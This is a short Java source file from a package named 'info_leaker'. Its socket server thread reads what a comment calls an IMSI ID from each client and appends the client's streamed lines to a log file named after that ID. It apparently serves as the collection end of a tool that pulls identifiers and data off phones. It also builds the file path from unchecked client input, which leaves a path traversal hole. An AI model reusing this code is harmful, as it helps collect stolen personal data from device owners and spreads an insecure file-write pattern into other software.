package com.info_leaker;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class ServerThread implements Runnable{
	BufferedReader is = null;	// input stream
	BufferedWriter os = null;	// output stream
	
	ServerThread(Socket s){
		try {
			//s.setSoTimeout(1000);
			is = new BufferedReader(new InputStreamReader(s.getInputStream()));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	@Override
	public void run() {
			String buff;

			try {
				buff = is.readLine();
				System.out.println("new client: " + buff);
				// path is \log\IMSI ID
				os = new BufferedWriter(new OutputStreamWriter(
						new FileOutputStream("log\\" + buff + ".txt", true))); 
	            while(!Common.END.equals(buff = is.readLine())){
	            	System.out.println("info from client: " + buff);
	            	if(buff != null)
	            		os.write(buff + "\r\n");
	            }
	            os.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	}

}
